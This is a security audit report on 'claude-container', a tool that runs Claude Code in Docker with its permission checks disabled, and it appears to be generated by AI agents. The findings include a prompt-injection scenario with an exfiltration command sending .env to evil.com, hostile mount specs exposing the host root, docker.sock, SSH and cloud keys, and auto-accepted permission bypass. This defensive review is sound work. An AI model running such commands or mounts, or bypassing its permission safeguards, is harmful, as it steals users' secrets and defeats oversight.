# Security Audit Report: claude-container

**Date:** 2026-03-22
**Project:** claude-container — CLI tool to run Claude Code inside Docker containers for sandboxing
**Methodology:** Parallel multi-agent security audit across 5 domains

---

## Executive Summary

claude-container relies on Docker containerization as its **sole security boundary** — Claude Code's built-in permission system is deliberately disabled. However, the container is created with minimal hardening: default capabilities, no resource limits, no network isolation, and critically, **no restrictions on what host paths can be mounted**. The most dangerous pattern is that an untrusted `.claude-container.json` checked into a cloned repository can silently mount sensitive host directories into a container where Claude runs with all permission checks disabled.

**Findings by Severity:**

| Severity | Count |
|----------|-------|
| CRITICAL | 3 |
| HIGH | 7 |
| MEDIUM | 11 |
| LOW | 4 |
| INFO | 2 |

---

## CRITICAL Findings

### C1. Unrestricted Host Path Mounts — Container Escape via Filesystem

**Files:** `src/container.ts:8-22`, `src/config.ts:53-68`, `src/index.ts:87-98`

The mount system performs **zero path-based restrictions**. Any host path can be bind-mounted into the container via `--mount` CLI flag or `.claude-container.json`. There is no blocklist or allowlist.

**Attack scenario:** A malicious `.claude-container.json` in a cloned repository can mount:
- `/:/host:rw` — full host filesystem access
- `/var/run/docker.sock:/var/run/docker.sock:rw` — Docker daemon access = full host compromise
- `~/.ssh:/keys:ro` — SSH private key theft
- `~/.aws:/creds:ro` — Cloud credential theft

The user receives **no warning or confirmation prompt** when mounts are loaded from a config file.

**Remediation:**
1. Implement a blocklist of sensitive paths (`/`, `/etc`, `/var/run/docker.sock`, `~/.ssh`, `~/.aws`, etc.)
2. Require explicit user confirmation for mounts defined in `.claude-container.json`
3. Display all mounts at startup for user review

---

### C2. `--dangerously-skip-permissions` Hardcoded and Auto-Accepted

**Files:** `src/exec.ts:11`, `entrypoint.sh:9-19`

Two mechanisms work together to silently grant unrestricted permissions:
1. `exec.ts` always appends `--dangerously-skip-permissions` to every Claude invocation — no opt-out exists
2. `entrypoint.sh` auto-writes `bypassPermissionsModeAccepted: true`, suppressing Claude Code's consent screen

Combined with C1, this means Claude can execute arbitrary commands on any mounted host path without any user approval.

**Remediation:**
1. Make `--dangerously-skip-permissions` opt-in via a CLI flag
2. Default to Claude's normal permission model
3. At minimum, print a visible warning that permissions are bypassed

---

### C3. Unverified Remote Script Execution (`curl | bash`)

**File:** `Dockerfile:21`

```dockerfile
RUN curl -fsSL https://claude.ai/install.sh | bash
```

Downloads and executes a remote script with no integrity verification — no checksum, no GPG signature, no version pinning.

**Remediation:** Download first, verify SHA-256 checksum, then execute. Or install via npm with a pinned version.

---

## HIGH Findings

### H1. No Capabilities Dropped, No Security Profiles

**File:** `src/container.ts:65-81`

The container runs with Docker's default capabilities (`CAP_NET_RAW`, `CAP_SETUID`, `CAP_SETGID`, `CAP_DAC_OVERRIDE`, etc.). No `no-new-privileges`, seccomp, or AppArmor profiles are applied.

**Remediation:** Add to `HostConfig`: `CapDrop: ["ALL"]`, `SecurityOpt: ["no-new-privileges:true"]`

---

### H2. No Resource Limits (CPU, Memory, PIDs)

**File:** `src/container.ts:65-81`

No `Memory`, `PidsLimit`, `CpuQuota`, or `Ulimits` are set. A fork bomb or memory exhaustion attack inside the container can DoS the entire host.

**Remediation:** Set `Memory: 4GB`, `PidsLimit: 512`, `CpuQuota: 100000`

---

### H3. No Network Isolation

**File:** `src/container.ts:65-81`

The container uses Docker's default bridge network with full outbound internet access and access to host-local services.

**Attack scenario:** Prompt injection causes Claude to exfiltrate source code or credentials via `curl https://evil.com/exfil -d @/workspace/.env`.

**Remediation:** Default to `NetworkMode: "none"`. Provide `--network` flag for opt-in.

---

### H4. Blanket CLAUDE_* Environment Variable Forwarding

**File:** `src/container.ts:28-31`

All host env vars matching `CLAUDE_*` are forwarded into the container. This can leak `CLAUDE_API_KEY` and other secrets. These are also permanently visible via `docker inspect`.

**Remediation:** Use an explicit allowlist of known safe variables instead of prefix matching.

---

### H5. Path Traversal via `--dir`

**Files:** `src/utils.ts:19-22`, `src/container.ts:10`

`--dir /` or `--dir /etc` mounts the entire root filesystem or sensitive directories as rw.

**Remediation:** Validate that `--dir` resolves to a user-owned, non-system directory.

---

### H6. Custom Dockerfile Support Widens Attack Surface

**Files:** `src/config.ts:82-85`, `src/image.ts:22`

`.claude-container.json` can specify an arbitrary Dockerfile, completely bypassing image hardening.

**Remediation:** Require explicit CLI opt-in for custom Dockerfiles rather than silent config file acceptance.

---

### H7. Unpinned Base Docker Image

**File:** `Dockerfile:1`

`FROM node:lts-slim` is a floating tag. Builds are not reproducible and vulnerable to upstream compromise.

**Remediation:** Pin to digest: `FROM node:lts-slim@sha256:<digest>`

---

## MEDIUM Findings

| # | Finding | File | Remediation |
|---|---------|------|-------------|
| M1 | Project dir always mounted `rw` | `container.ts:10` | Default to `ro`, offer `--rw` flag |
| M2 | Config `env` values not type-validated | `config.ts:70-75` | Validate each value is a string |
| M3 | Mount spec colon-based misparsing | `index.ts:87-98` | Limit split, validate mode field |
| M4 | Plaintext secrets in `.claude-container.json` | `config.ts:70-75` | Document, add env-var reference syntax |
| M5 | Docker named volume credentials lack access controls | `container.ts:72-76` | Use bind mount with 0600 perms |
| M6 | Env vars exposed via `docker inspect` | `container.ts:65-68` | Use Docker secrets or tmpfs files |
| M7 | `.dockerignore` missing sensitive path exclusions | `.dockerignore` | Use allowlist approach (`*` then `!entrypoint.sh`) |
| M8 | NPM caret ranges allow version drift | `package.json` | Use exact versions or enforce `npm ci` |
| M9 | 4 packages with native install scripts | `package-lock.json` | Audit scripts, consider `--ignore-scripts` |
| M10 | 69 transitive production dependencies | `package-lock.json` | Evaluate if `dockerode` is necessary vs `child_process` |
| M11 | `allowUnknownOption(true)` enables unvalidated passthrough | `index.ts:45-46` | Use `--` separator convention |

---

## LOW Findings

| # | Finding | File | Remediation |
|---|---------|------|-------------|
| L1 | `CLAUDE_CONFIG_DIR` overridable via env forwarding | `entrypoint.sh:4` | Exclude from wildcard forwarding |
| L2 | `.gitignore` missing sensitive patterns | `.gitignore` | Add `.env`, `.npmrc`, `*.pem`, etc. |
| L3 | APT packages installed without version pinning | `Dockerfile:6-13` | Pin versions or rely on image digest pin |
| L4 | Build output may leak secrets from custom Dockerfiles | `image.ts:71-79` | Add `--quiet` option |

---

## INFO Findings

| # | Finding | Notes |
|---|---------|-------|
| I1 | Unnecessary TTY allocation on container | Cosmetic, minimal risk |
| I2 | `package-lock.json` committed (positive) | Good practice, ensures reproducible installs |

---

## Trust Boundary Analysis

The tool provides a **false sense of security** in its current state:

```
┌─────────────────────────────────────────────────────────┐
│ HOST                                                    │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │ CONTAINER (intended sandbox)                     │   │
│  │                                                  │   │
│  │  Claude Code (--dangerously-skip-permissions)    │   │
│  │  ├── Full rw access to /workspace (= host dir)  │   │
│  │  ├── Full outbound network access                │   │
│  │  ├── All CLAUDE_* env vars from host             │   │
│  │  ├── Default Linux capabilities                  │   │
│  │  └── Any extra mounts (unrestricted)             │   │
│  │                                                  │   │
│  └──────────────────────────────────────────────────┘   │
│                                                         │
│  Blast radius if Claude goes rogue:                     │
│  ✗ Destroy/modify all project files on host             │
│  ✗ Exfiltrate source code and secrets via network       │
│  ✗ Access any additionally mounted host directories     │
│  ✗ Install persistent backdoors in project              │
│  ✓ Cannot access host files outside mounts              │
│  ✓ Cannot access host processes                         │
│  ✓ Cannot escalate to host root (without kernel vuln)   │
└─────────────────────────────────────────────────────────┘
```

---

## Top 5 Priority Remediations

1. **Implement mount path validation** — blocklist sensitive paths, require user confirmation for config-file mounts (fixes C1, H5)
2. **Harden container creation** — drop capabilities, set `no-new-privileges`, add resource limits, default to no network (fixes H1, H2, H3)
3. **Make permission bypass opt-in** — don't hardcode `--dangerously-skip-permissions`, show warnings (fixes C2)
4. **Pin supply chain artifacts** — pin Docker base image by digest, verify install script integrity (fixes C3, H7)
5. **Use env var allowlist** — replace `CLAUDE_*` wildcard with explicit safe-variable list (fixes H4)

---

*Generated by a 5-agent parallel security audit team on 2026-03-22*
